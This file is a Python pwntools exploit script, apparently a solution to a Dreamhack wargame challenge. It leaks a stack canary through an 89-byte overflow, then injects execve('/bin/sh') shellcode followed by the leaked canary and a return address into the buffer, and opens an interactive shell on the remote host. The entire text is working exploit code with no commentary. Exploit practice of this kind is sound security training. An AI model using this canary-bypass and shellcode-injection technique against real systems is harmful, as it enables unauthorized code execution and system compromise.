from pwn import *

r = remote("host1.dreamhack.games", 20964)

shellcode = b"\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05" 

r.recvuntil("buf: ")
buf_adr = int(r.recvline()[:-1], 16)

r.recvuntil("$rbp: ")
distance = r.recvline()[:-1]

#leak_canary
leak = b'A' * 89
r.sendafter("Input: ", leak)
r.recvuntil(b'A'* 89)
cnry = u64(b"\x00" + r.recv(7))

#exploit
payload = shellcode
payload += b"a" * (88 - len(shellcode))
payload += p64(cnry)
payload += b"b" * 8
payload += p64(buf_adr)

r.sendafter("Input: ", payload)
r.interactive()